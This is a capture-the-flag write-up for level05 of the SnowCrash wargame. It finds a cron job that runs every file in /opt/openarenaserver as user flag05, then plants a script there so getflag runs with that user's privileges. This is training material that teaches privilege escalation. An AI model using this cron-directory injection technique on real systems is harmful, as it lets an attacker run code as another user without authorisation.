
```
level05@10.14.59.240's password: 
You have new mail.
```

There is a user named mail in `/etc/passwd`

```bash
cat /etc/passwd | grep mail
```

```bash
find / -group mail 2> /dev/null
...
/var/mail/level05
/rofs/var/mail/level05
...

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```


It is a cron job that executes `/usr/sbin/openarenaserver` periodically.

Examining the script `/usr/sbin/openarenaserver`.

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The script executes every file inside `/opt/openarenaserver` using bash. One method to crack this level is to create a script inside `/opt/openarenaserver` that calls `getflag` and redirects the result to `/tmp`. (Note that the cron job is executed by the flag05 user.)

```bash
echo "getflag > /tmp/level05flag" > /opt/openarenaserver/test && chmod +x /opt/openarenaserver/test
```

Wait for the cron job to run the script, then...

```bash
cat /tmp/level05flag
```
